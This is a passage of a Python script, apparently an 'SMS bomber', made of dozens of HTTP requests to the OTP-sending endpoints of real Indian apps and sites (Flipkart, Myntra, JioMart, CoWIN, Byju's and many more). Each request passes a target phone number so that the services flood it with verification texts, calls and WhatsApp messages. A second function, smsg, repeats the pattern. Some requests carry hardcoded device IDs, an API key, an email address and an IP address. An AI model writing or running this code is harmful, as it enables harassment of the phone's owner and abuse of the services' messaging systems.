        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'deviceType': 'Website',
        'mobileNo': number,
        'deviceId': '',
    }

    response = requests.post('https://customer.megacabs.com/api/otpforLogin', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'feature': '',
        'phone': '+91-'+number,
        'type': 'sms',
        'app_client_id': 'null',
    }

    response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'variables': {
            'mobileNo': number,
        },
        'query': 'mutation SellerOnboarding_GenerateOTPMobile($mobileNo: String!) {\n  generateOTPMobile(mobileNo: $mobileNo)\n}\n',
        'operationName': 'SellerOnboarding_GenerateOTPMobile',
    }

    response = requests.post('https://seller.flipkart.com/napi/graphql', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'id': number,
        'journeySource': 'REGISTER',
    }

    response = requests.post('https://www.tataplay.com/inception-pack/otp/resend-otp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'isPlaycircle': False,
        'mobile': number,
        'deviceId': '72abdd9a-7038-41c0-a57d-d0022dac60da',
        'deviceName': '',
        'refCode': '',
    }

    response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'query': '\nmutation {\n    createAccountOTP(\n        mobilenumber:"91'+number+'",\n        websiteId:1\n    )\n        {\n            status\n            message\n        }\n}',
    }

    response = requests.post('https://admin.vedistry.com/graphql', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile_number': number,
    }

    response = requests.post('https://staff.lendenclub.com/core/lender_app/v3/send-otp/', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone_no': '+91'+number,
        'website': True,
        'is_guest_checkout': False,
    }

    response = requests.post('https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'country_code': '+91',
        'phone': number,
    }

    response = requests.post(
        'https://services.rappi.com.br/api/rappi-authentication/login/whatsapp/create',
        headers=headers,
        json=json_data,
    )











    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'Mobile': number,
    }

    # response = requests.post('https://shop.dhanyasupermarket.com/Authentication/GetOtp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'isEmail': False,
        'mobileNo': number,
    }

    response = requests.post('https://api.bajajcapitalone.com/nps/api/v1/GenerateOTP', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'feature': '',
        'phone': '+91-'+number,
        'type': 'call',
        'app_client_id': 'null',
    }

    response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'Mobile': number,
    }

    # response = requests.post('https://shop.dhanyasupermarket.com/Authentication/GetOtp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile': number,
    }

    response = requests.post('https://workspace.ackodrive.com/api/login/otp/', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mfa_channels': {
            'phno': {
                'number': 7.679565708E9,
                'country_code': '+91',
            },
        },
    }

    response = requests.post('https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone': number,
    }

    response = requests.post('https://api.behica.com/v1/api/auth/customer', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile': 7.679565708E9,
    }

    response = requests.post('https://cdn-api.co-vin.in/api/v2/auth/generateMobileOTP', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone': '+91'+number,
    }

    response = requests.post('https://entri.app/api/v3/users/check-phone/', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile': number,
    }

    response = requests.post('https://cmsapi.gromo.in/api/cms/v1/customer/login', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone': '+91-'+number,
        'app_client_id': '90391da1-ee49-4378-bd12-1924134e906e',
    }

    response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile_number': number,
    }

    response = requests.post('https://hyuga-auth-service.pratech.live/v1/auth/otp/generate', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'glusr_id': '190634360',
        'authCode': '',
        'OTPResend': 1.0,
        'user_country': 'India',
        'verifyUser': False,
        'screenName': 'IMOB EDIT PROFILE',
        'source': '',
        'type': 'OTPGEN',
        'ciso': 'IN',
        'glid': '190634360',
        'user_mobile_country_code': '91',
        'attribute_id': '',
        'userIp': '132.154.79.32',
        'emailVerify': '',
        'user': number,
        'msg_key': 0.0,
        'email': '',
    }

    response = requests.post(
        'https://m.indiamart.com/ajaxrequest/identified/common/otpVerification',
        headers=headers,
        json=json_data,
    )







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'isd_code': '+91',
        'mobile': number,
        'medium': 'SMS',
    }

    response = requests.post('https://api.betterhalf.ai/v2/auth/otp/send/', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'app_signature': 'Jc/Zu7qNqQ2',
        'country_code': '+91',
        'phone': number,
    }

    response = requests.post('https://api.khatabook.com/v1/auth/request-otp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone': number,
    }

    response = requests.post('https://www.licious.in/api/login/signup', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile': number,
    }

    response = requests.post('https://www.mahindrafirstchoice.com/sell-car-india/verifymobile', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'buildVersion': '25.27',
        'phone': number,
        'source': 'signup',
        'type': 'p',
        'device': 'mobile',
        'email': '',
    }

    response = requests.post('https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'contact_number': number,
    }

    response = requests.post('https://mobile.otocapital.in/api/v1/otp/create/', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobileNumber': number,
    }

    response = requests.post('https://api.payrup.com/api/auth/otp/generate', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'countryCode': '+91',
        'mobile': number,
    }

    response = requests.post('https://api.playo.io/onboard/generateOTP', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'offer': '',
        'phone_no': 7.679565708E9,
        'full_name': 'Riya ',
        'bank_product_id': 63.0,
    }

    response = requests.post('https://api.referloan.in/api/generate-otp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'web_login': True,
        'phone_number': number,
    }

    response = requests.post('https://saralk.ccdms.in/zila/api/login', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'variables': {},
        'query': '{\n        registerOtp(\n            mobile: "'+number+'"\n            action: "registerotp"\n            legalencode: "true"\n        )\n        {\n           status\n           data {\n               expirytime\n           }\n           message\n        }\n    }',
    }

    response = requests.post('https://www.spencers.in/graphql', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile_number': number,
    }

    response = requests.post('https://api.shadowfax.in/delivery/otp/send/', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'enable-email': 'true',
    }

    json_data = {
        'country_code': 'IN',
        'phone': number,
        'is_un_teach_user': False,
        'otp_type': 1.0,
        'send_otp': True,
        'email': '',
    }

    response = requests.post('https://unacademy.com/api/v3/user/user_check/', params=params, headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'ver': '1701842546',
        'phoneNumber': number,
        'phoneCode': '+91',
        'version': 2.0,
    }

    response = requests.post('https://user.vedantu.com/user/preLoginVerification', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'query': 'mutation {\n    createAccountOTP(\n        mobilenumber:"91'+number+'",\n        websiteId:1\n    )\n        {\n            status\n            message\n        }\n}',
    }

    response = requests.post('https://admin.vedistry.com/graphql', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phoneNumber': '+91'+number,
        'apiKey': '3__kVl5g5H3qeFTZkCfm0F11jv0lwwsr_I3cGBk5gi1gSZkuAiwx3NxN9EtQcgoeax',
        'locale': 'en',
    }

    response = requests.post('https://www.c377768625-eu.com/sendotp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'website_id': 1.0,
        'username': number,
    }

    response = requests.post('https://www.kamaayurveda.in/api/send-otp-verify', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phoneNumber': number,
        'appPackageName': 'in.ludo.supremegold',
    }

    response = requests.post('https://app.ludosupreme.com/v1.0/user/requestSignupOtp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile_number': number,
    }

    response = requests.post('https://api.bookscape.com/ecom/api/user/send-otp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'captcha': '25943b63fa8e51857625996a76cc95e7cf913fb93e33c50ae59f3f64014c8ae8491cc9a3465fd6748c2e64fa08063b181273367a8ee6d9870c4ac553ec705eec8ef753d46f2329db284c469803a1bb4301e3370baa60d64a4cd09f55235b94df614abde6910255c568acc10e640a41fba8c4a06144f79d90831057a58e657bd2e82cc92deef70c197369019a3afd15916ecf7c688c0805eda674244bf78c65eeaf9c7f044b9897584d9e3cde6afd45b1',
        'mobileNumber': number,
        'value': 'FPKh',
    }

    response = requests.post('https://www.augmont.com/api/customer/customer-sign-up', headers=headers, json=json_data)







    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'email': number,
        'country_code': '91',
    }

    response = requests.get('https://vyaparapp.in/resend/otp', params=params, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    response = requests.get('https://be.mcdelivery.co.in/auth/otp/'+number, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'Channel': 'W',
        'otpCRMrequired': 'true',
        'otpeCOMrequired': 'true',
        'smssndcnt': '3',
        'otpBasedLogin': 'false',
        'LoyaltyProvider': '',
        'MobileNO': number,
        'countryPhoneCode': '+91',
        'Format': 'html',
    }

    response = requests.get('https://www.sparindia.com/WebAPI/CRMActivation/Validate', params=params, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'mobile_no': number,
    }

    response = requests.get(
        'https://www.jiomart.com/mst/rest/v1/session/initiate/using_mobileno_n_otp',
        params=params,
        headers=headers,
    )


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    response = requests.get('https://be.mcdelivery.co.in/auth/otp/'+number+'/', headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    response = requests.get('https://dlv-api.delhivery.com/client-profile/otp/generate/+91'+number, headers=headers)


    headers = {
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    params = {
        'mobileNumber': number,
    }

    response = requests.get('https://securedapi.confirmtkt.com/api/platform/registerOutput', params=params, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'functionName': 'check_user',
        'user': number,
    }

    response = requests.get('https://www.bookchor.com/ajax-new.php', params=params, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    response = requests.get(
        'https://api.dotshowroom.in/api/dotk/vo1/user/login/'+number+'?source=digital_showroom&domain=https://onlinemeat.in/cart',
        headers=headers,
    )


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'mobile': number,
    }

    response = requests.get('https://platform-api.tajnetwork.com/v1/register/player', params=params, headers=headers)


    headers = {
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    params = {
        'mobile': number,
        'email': '',
        'fetchdatatype': 'userotp',
    }

    # response = requests.get('https://railmadad.indianrailways.gov.in/madad/FetchData', params=params, headers=headers, verify=False)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'loginPhoneEmail': number,
    }

    response = requests.get('https://www.bykemania.com/invest/src/sendLoginOtp.php', params=params, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'mobile': '+91-'+number,
    }

    response = requests.get('https://students.byjus.com/mobiles/request_otp', params=params, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'mobile': number,
    }

    response = requests.get('https://www.tractorjunction.com/ajax/send-otp/', params=params, headers=headers)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'number': number,
        'is_corporate_user': False,
        'otp_on_call': True,
    }

    response = requests.post('https://www.1mg.com/auth_api/v6/create_token', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'queryName': 'getOTP',
    }

    json_data = {
        'variables': {
            'input': {
                'mobile': number,
                'communicationPreference': True,
            },
        },
        'query': 'query($input: mobileInput){ getOTP(input: $input) { code message causes totalElements data { mobile returningUser } }}',
    }

    response = requests.post('https://gql.meatigo.com/', params=params, headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile': number,
        'otp_type': 'REGISTER',
    }

    response = requests.post('https://www.gyftr.com/smartbuyapi/hdfc/api/v1/v2/sent/otp_register', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'otptype': 'sms',
        'os': 'android',
        'phone': number,
        'resend': True,
        'isdcode': '+91',
        'email': '',
    }

    response = requests.post('https://api.beatoapp.com/v1/onboarding/generateotp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phoneNumber': number,
        'medium': 'WHATSAPP',
    }

    response = requests.post('https://api.myhubble.money/v1/auth/otp/generate', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'app_version': '7.10.2',
        'aaid': 'a4c4e462-2744-4c94-85ea-db8b47f75d00',
        'course': '',
        'phone_number': number,
        'language': 'en',
        'udid': '0ae3a1bee1561e32',
        'class': '',
        'gcm_reg_id': 'f38jugJKSEKBOkcASRbSiJ:APA91bElvA0mtSl4LIYxxH60qQJP_U8bU9ew16vhiiQRdSzVFpJOBtr9ooY4hbOd2NmALUDt5sERZsO0NLRob3zf2MoCoaqciF2XibBo22VPxYIFqDULptYTVrEcgZCQ_qpXAfYKD-iR',
    }

    response = requests.post('https://api.doubtnut.com/v4/student/login', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'request': {
            'appID': '091fcd0ccc078ace60137447356f20d1',
            'formFactor': 'M',
            'requestType': 'U',
            'response_format': 'json',
            'data': {
                'mobile': number,
                'remote_add': '0.0.0.0',
                'user_agent': 'StockNote -42026,Android,Google,Android 13,CFNetwork 808.3,Darwin 16.3.0',
            },
        },
    }

    response = requests.post(
        'https://tradws.stocknote.com/samco-webservice/AOF/LoginMobileOtp/1.0.0',
        headers=headers,
        json=json_data,
    )







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        '_mn_': number,
        '_u_': number,
        'userType': 'P',
        '_p_': '',
    }

    response = requests.post(
        'https://my.fortishealthcare.com/service/myfortis/v1/login/api/generate-login-otp',
        headers=headers,
        json=json_data,
    )











    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'locationUrl': 'https://cars.tatamotors.com',
        'reqBody': {
            'countryCode': '91',
            'phone': number,
            'sendOtp': 'true',
        },
    }

    response = requests.post(
        'https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json',
        headers=headers,
        json=json_data,
    )











    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'otp_mode': 'SIGNUP',
        'mobile': number,
    }

    response = requests.post('https://api.tendercuts.in/otp/v2/generate/', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'hash_key': 'XfsoCeXADQA',
        'phone_number': number,
    }

    response = requests.post('https://omni-api.moreretail.in/api/v1/login/', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'cstmMob': number,
    }

    response = requests.post(
        'https://clicktobuy.hyundai.co.in/ctb/bank/generateOtpForAuthentication.ctb',
        headers=headers,
        json=json_data,
    )











    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile_number': number,
        'client_id': 'kisan-app',
    }

    response = requests.post('https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile': number,
        'otpOperationType': 'SignUp',
    }

    response = requests.post(
        'https://prod-backend.trinkerr.com/api/v1/web/traders/generateOtpForLogin',
        headers=headers,
        json=json_data,
    )







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'retry_mode': 'voice',
        'mobile': number,
    }

    response = requests.post('https://api.tendercuts.in/otp/retry/', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'user_id': number,
    }

    response = requests.post('https://www.samsung.com/in/api/v1/sso/otp/init', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone': number,
    }

    response = requests.post('https://m.mirraw.com/accounts/send_otp', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    json_data = {
        'debug': False,
        'phone': number,
    }

    response = requests.post('https://carnotapp.in/users/auth/', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'appVersion': '15',
        'isVoice': False,
        'gaid': '',
        'customerMobile': number,
        'androidId': '6724a007b0060e30',
        'marketId': '10003',
    }

    response = requests.post('https://api.pokketkredit.com/customer/otp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'imei': '',
        'otp_hash': 'EW0sznEa82P',
        'contact_number': number,
    }

    response = requests.post('https://api.blackbuck.com/demand-wrapper/demand/v1/signUp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile': number,
        'verificationChannel': 5.0,
    }

    response = requests.post('https://api.rummytime.com/api/auth/generateOtp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phoneNumber': number,
    }

    response = requests.post('https://api.myhubble.money/v1/auth/otp/generate', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'retries': 0.0,
        'phone_number': number,
        'request_id': 'amvCc_1681028165840',
        'hash_type': 'play_store',
    }

    response = requests.post('https://production.apna.co/api/userprofile/v1/otp/', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile': number,
        'type': 'SIGNIN_WITH_MOBILE',
    }

    response = requests.post('https://www.shoppersstop.com//services/v2_1/ssl/sendOTP/OB', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone': number,
        'source': 'order_management',
        'type': 'call',
        'hash': True,
    }

    response = requests.post('https://api-app.prod.oziva.in/nitro/send/', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phone': number,
        'source': 'signup',
        'type': 'p',
        'device': 'app',
        'email': '',
    }

    response = requests.post('https://api.moglix.com/login/sendOTP', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mode': 'SMS',
        'new_user': True,
        'mobile_number': number,
        'device': 'Android',
    }

    response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mobile': number,
    }

    response = requests.post('https://web-api.mpokket.in/registration/sendOtp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'data': {
            'mobileNumber': number,
        },
    }

    response = requests.post('https://service.upstox.com/login/open/v5/auth/1fa/otp/generate', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mode': 'WHATSAPP',
        'new_user': True,
        'mobile_number': number,
        'device': 'Android',
    }

    response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, json=json_data)







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'code': '+91',
        'mobile': number,
    }

    response = requests.post('https://freshcutsindia.in/capi/p_mobile_login.php', headers=headers, json=json_data)







    headers = {
        'Content-Type': 'application/json; charset=utf-8',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    params = {
        'ts': '1703254288525',
    }

    json_data = {
        'mobile': number,
        'challengeType': 'SMS-OTP',
        'appCode': 'nkhssbc',
    }

    response = requests.post(
        'https://api.rodeodigital.com/identity/api/v1/auth/challenge',
        params=params,
        headers=headers,
        json=json_data,
    )







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'appVersion': 30207.0,
        'phone': '91'+number,
        'message': 'login',
    }

    response = requests.post(
        'https://webapi.magicpin.in/ultron-onboarding/merchant/sendOtpWithMessage',
        headers=headers,
        json=json_data,
    )







    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'client_os': 'eatsure_android',
        'app_version': '10244',
        'device_id': '10cfa12bd7ccb9b4',
    }

    json_data = {
        'dialing_code': '+91',
        'country_code': 'IND',
        'communication_channel': 'sms',
        'phone_number': number,
        'is_new_customer': True,
    }

    response = requests.post('https://thanos.faasos.io/v3/customer/generate_otp.json', params=params, headers=headers, json=json_data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'mode': 'IVR',
        'new_user': True,
        'mobile_number': number,
        'device': 'Android',
    }

    response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, json=json_data)





def smsg(number):
    
    number = str(number)
    # print(number)
    mobile  =  number
    headers = {
        'user-agent': 'okhttp/3.9.1',
    }


    zgaszvcxd = f'https://www.jiomart.com/mst/rest/v1/id/details/{number}'
    response = requests.get(zgaszvcxd, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'mobile': number,
    }

    response = requests.get('https://www.tractorjunction.com/ajax/send-otp/', params=params, headers=headers)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }
    rrr =  f'https://dlv-api.delhivery.com/client-profile/otp/generate/+91{number}'
    response = requests.get(rrr, headers=headers)


    headers = {
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.9.1',
    }

    params = {
        'mobile': number,
        'email': '',
        'fetchdatatype': 'userotp',
    }

    # response = requests.get('https://railmadad.indianrailways.gov.in/madad/FetchData', params=params, headers=headers,  verify=False)


    headers = {
        'user-agent': 'okhttp/3.9.1',
    }

    rr = f'https://be.mcdelivery.co.in/auth/otp/{number}/'
    response = requests.get(rr, headers=headers)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'j_fullname': 'Hii',
        'journey': 'mobile',
        'agree': True,
        'numberEdit': False,
        'j_mobilenumber': number,
        'swp': True,
    }

    response = requests.post('https://m.snapdeal.com/signupCompleteAjax', headers=headers, json=json_data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    params = {
        'enable-email': 'true',
    }

    json_data = {
        'country_code': 'IN',
        'phone': number,
        'is_un_teach_user': False,
        'otp_type': 1.0,
        'send_otp': True,
        'email': '',
    }

    response = requests.post('https://unacademy.com/api/v3/user/user_check/', params=params, headers=headers, json=json_data)



    headers = {
        'user-agent': 'okhttp/3.9.1',
    }
    fff = f'https://vlccbackend.happly.in/rest/V1/api/registrationsendsms?receiverPhoneNumber={number}&email=mkvcinemas812@gmail.com&storeId=1&type=otp'
    response = requests.get(
        fff,
        headers=headers,
    )


    headers = {
        'content-type': 'application/json; charset=utf-8',
        'user-agent': 'okhttp/3.9.1',
    }

    json_data = {
        'phoneNumber': number,
        'signup': 'ONECLICK',
    }

    response = requests.post('https://www.myntra.com/gateway/v1/auth/getotp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phoneNumber":"6789067890","signup":"ONECLICK"}'
    #response = requests.post('https://www.myntra.com/gateway/v1/auth/getotp', headers=headers, data=data)


    headers = {
        'content-type': 'application/json; charset=utf-8',
